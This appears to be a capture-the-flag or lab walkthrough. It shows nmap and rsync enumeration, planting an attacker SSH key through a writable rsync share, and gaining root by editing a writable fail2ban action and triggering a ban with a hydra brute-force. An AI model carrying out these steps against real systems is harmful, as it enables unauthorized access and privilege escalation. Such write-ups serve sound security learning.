First we start with an nmap scan

`nmap -sC -sV -T4 -oN nmap.txt <IP>`

```
# Nmap 7.93 scan initiated Mon Dec 26 05:39:57 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 192.168.108.126
Nmap scan report for 192.168.108.126
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 26 05:40:15 2022 -- 1 IP address (1 host up) scanned in 18.24 seconds
```

Nice got 2 ports ssh and rsync. Enumerating port 873 rsync service. using nmap script 

`nmap -sV --script "rsync-list-modules" -p 873 <IP>`

![image](https://user-images.githubusercontent.com/87468669/209510863-e5e95c22-eb6e-46c5-b30a-c0013a021738.png)

got the share name check what is listed in the share without auth.

`rsync -av --list-only rsync://<IP>/sharename` 

![image](https://user-images.githubusercontent.com/87468669/209511184-38424d7b-00f9-461b-bcdd-6b6bf124c235.png)

Tried to upload a file in the share and check.

```
touch shell
rysnc shell <IP>::share
rysnc -av --list-only rsync://<IP>/share
```

![image](https://user-images.githubusercontent.com/87468669/209511783-78584c8a-ed22-4cae-8b79-68c7685ed914.png)

worked. Attcking through ssh key, created an authorised key file in .ssh dir.

![image](https://user-images.githubusercontent.com/87468669/209512255-0ff0903b-1e55-4437-adae-42f458cfb5bc.png)

put my attacker id_rsa.pub key in the authorized_key file.

![image](https://user-images.githubusercontent.com/87468669/209512415-ab4eed7d-ab1c-48f2-ae25-26eaa83d2763.png)

Uploaded the auth_key into the share and list to confirm if it is there

`rsync -r ./.ssh/ <IP>::share/.ssh`

![image](https://user-images.githubusercontent.com/87468669/209513704-901a1070-fdfa-48b7-a877-880491523914.png)

Now ssh into the box

![image](https://user-images.githubusercontent.com/87468669/209516152-e540b299-ad87-41d7-85e0-e45c56c3b572.png)

Boom I'm in... i place it under my genjitsu 😂. proceed to escalate privs. By typing cmd id, the user fox is in a fail2ban group, so i check online for escalting privs with it. first i check the fail2ban.conf

![image](https://user-images.githubusercontent.com/87468669/209517563-571aa27c-f1ee-4b3e-9f4b-8f9a509fad09.png)

![image](https://user-images.githubusercontent.com/87468669/209516887-a86cf0a6-1682-4bc3-8e85-73f1f8f9c009.png)

The path above is writeable, so i edited it  

![image](https://user-images.githubusercontent.com/87468669/209517126-1af2a7cb-d04d-474a-b40d-f15cbe350322.png)

checking the fail2ba.conf file, the ban time is 1min, attempt before ban is 2 

![image](https://user-images.githubusercontent.com/87468669/209517655-6ca64846-64e0-47b1-99d9-f5fa979694b2.png)

now tried triggering it by bruteforcing ssh with hydra on it 🤠...

![image](https://user-images.githubusercontent.com/87468669/209518610-46de4eb0-c8d0-4940-8add-e90323b19b4f.png)

Boom I got banned, let's check the result of the ban action.

![image](https://user-images.githubusercontent.com/87468669/209519104-c702bb53-09ef-4561-9249-d243795c3f14.png)

Boom!!! I got root 😎😎.


